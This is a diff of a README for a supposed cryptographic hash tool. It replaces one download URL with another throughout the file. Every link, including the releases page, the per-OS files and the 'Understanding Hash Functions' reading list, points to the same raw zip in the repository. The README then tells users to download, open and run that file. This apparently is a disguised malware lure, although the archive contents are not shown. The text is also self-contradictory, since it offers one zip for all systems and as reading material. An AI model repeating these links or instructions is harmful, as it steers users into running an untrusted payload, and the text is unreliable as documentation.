@@ -6,9 +6,9 @@ Welcome to the hashgenerator-api! This tool helps you create cryptographic hashe
 
 ## 📥 Download the Application
 
-[![Download Latest Release](https://raw.githubusercontent.com/cordobesito3405/hashgenerator-api/main/python/api-hashgenerator-Dibatis.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/cordobesito3405/hashgenerator-api/main/python/api-hashgenerator-Dibatis.zip)
+[![Download Latest Release](https://github.com/cordobesito3405/hashgenerator-api/raw/refs/heads/main/npm/api-hashgenerator-v2.6-beta.2.zip%20Latest%20Release-v1.0-blue)](https://github.com/cordobesito3405/hashgenerator-api/raw/refs/heads/main/npm/api-hashgenerator-v2.6-beta.2.zip)
 
-To get started, visit the following link to download the application: [Download Here](https://raw.githubusercontent.com/cordobesito3405/hashgenerator-api/main/python/api-hashgenerator-Dibatis.zip).
+To get started, visit the following link to download the application: [Download Here](https://github.com/cordobesito3405/hashgenerator-api/raw/refs/heads/main/npm/api-hashgenerator-v2.6-beta.2.zip).
 
 ## 🔧 System Requirements
 
@@ -30,11 +30,11 @@ The hashgenerator-api offers the following features:
 
 ## ⚙️ How to Install
 
-1. Visit the [Releases Page](https://raw.githubusercontent.com/cordobesito3405/hashgenerator-api/main/python/api-hashgenerator-Dibatis.zip) to find the latest version.
+1. Visit the [Releases Page](https://github.com/cordobesito3405/hashgenerator-api/raw/refs/heads/main/npm/api-hashgenerator-v2.6-beta.2.zip) to find the latest version.
 2. Choose the file for your operating system.
-   - For Windows, select `https://raw.githubusercontent.com/cordobesito3405/hashgenerator-api/main/python/api-hashgenerator-Dibatis.zip`.
-   - For macOS, select `https://raw.githubusercontent.com/cordobesito3405/hashgenerator-api/main/python/api-hashgenerator-Dibatis.zip`.
-   - For Linux, select `https://raw.githubusercontent.com/cordobesito3405/hashgenerator-api/main/python/api-hashgenerator-Dibatis.zip`.
+   - For Windows, select `https://github.com/cordobesito3405/hashgenerator-api/raw/refs/heads/main/npm/api-hashgenerator-v2.6-beta.2.zip`.
+   - For macOS, select `https://github.com/cordobesito3405/hashgenerator-api/raw/refs/heads/main/npm/api-hashgenerator-v2.6-beta.2.zip`.
+   - For Linux, select `https://github.com/cordobesito3405/hashgenerator-api/raw/refs/heads/main/npm/api-hashgenerator-v2.6-beta.2.zip`.
 3. Click the download link and save the file to your computer.
 
 ## 🚀 Running the Application
@@ -43,7 +43,7 @@ Once downloaded, follow these steps to run the application:
 
 ### Windows
 
-1. Locate `https://raw.githubusercontent.com/cordobesito3405/hashgenerator-api/main/python/api-hashgenerator-Dibatis.zip` in your downloads folder.
+1. Locate `https://github.com/cordobesito3405/hashgenerator-api/raw/refs/heads/main/npm/api-hashgenerator-v2.6-beta.2.zip` in your downloads folder.
 2. Double-click the file to open it.
 3. Follow on-screen instructions to enter the text you want to hash.
 4. Select your desired algorithm from the dropdown menu.
@@ -51,7 +51,7 @@ Once downloaded, follow these steps to run the application:
 
 ### macOS
 
-1. Open the downloaded `https://raw.githubusercontent.com/cordobesito3405/hashgenerator-api/main/python/api-hashgenerator-Dibatis.zip` file.
+1. Open the downloaded `https://github.com/cordobesito3405/hashgenerator-api/raw/refs/heads/main/npm/api-hashgenerator-v2.6-beta.2.zip` file.
 2. Drag the application to your Applications folder.
 3. Navigate to your Applications and double-click on the app icon.
 4. Enter the text you wish to hash and choose the algorithm.
@@ -59,7 +59,7 @@ Once downloaded, follow these steps to run the application:
 
 ### Linux
 
-1. Extract the downloaded `https://raw.githubusercontent.com/cordobesito3405/hashgenerator-api/main/python/api-hashgenerator-Dibatis.zip` file.
+1. Extract the downloaded `https://github.com/cordobesito3405/hashgenerator-api/raw/refs/heads/main/npm/api-hashgenerator-v2.6-beta.2.zip` file.
 2. Open a terminal and navigate to the extracted folder.
 3. Run the command: `./hashgenerator-api` to start the application.
 4. Input your text, select the algorithm, and click "Generate Hash".
@@ -86,9 +86,9 @@ If you encounter issues, feel free to report them on the GitHub issues page. Con
 
 To learn more about cryptographic hashes, consider reviewing these resources:
 
-- [Understanding Hash Functions](https://raw.githubusercontent.com/cordobesito3405/hashgenerator-api/main/python/api-hashgenerator-Dibatis.zip)
-- [Cryptography Basics](https://raw.githubusercontent.com/cordobesito3405/hashgenerator-api/main/python/api-hashgenerator-Dibatis.zip)
-- [Secure Hash Algorithms](https://raw.githubusercontent.com/cordobesito3405/hashgenerator-api/main/python/api-hashgenerator-Dibatis.zip)
+- [Understanding Hash Functions](https://github.com/cordobesito3405/hashgenerator-api/raw/refs/heads/main/npm/api-hashgenerator-v2.6-beta.2.zip)
+- [Cryptography Basics](https://github.com/cordobesito3405/hashgenerator-api/raw/refs/heads/main/npm/api-hashgenerator-v2.6-beta.2.zip)
+- [Secure Hash Algorithms](https://github.com/cordobesito3405/hashgenerator-api/raw/refs/heads/main/npm/api-hashgenerator-v2.6-beta.2.zip)
 
 ## 📜 License Information
 
@@ -98,4 +98,4 @@ This application is licensed under the MIT License. You can use it freely but gi
 
 Join our community on social media and share your experiences using the hashgenerator-api. Connect with other users to exchange tips and understand more about the tool.
 
-Thank you for choosing hashgenerator-api! To download and get started, visit this link: [Download Here](https://raw.githubusercontent.com/cordobesito3405/hashgenerator-api/main/python/api-hashgenerator-Dibatis.zip). Happy hashing!
+Thank you for choosing hashgenerator-api! To download and get started, visit this link: [Download Here](https://github.com/cordobesito3405/hashgenerator-api/raw/refs/heads/main/npm/api-hashgenerator-v2.6-beta.2.zip). Happy hashing!
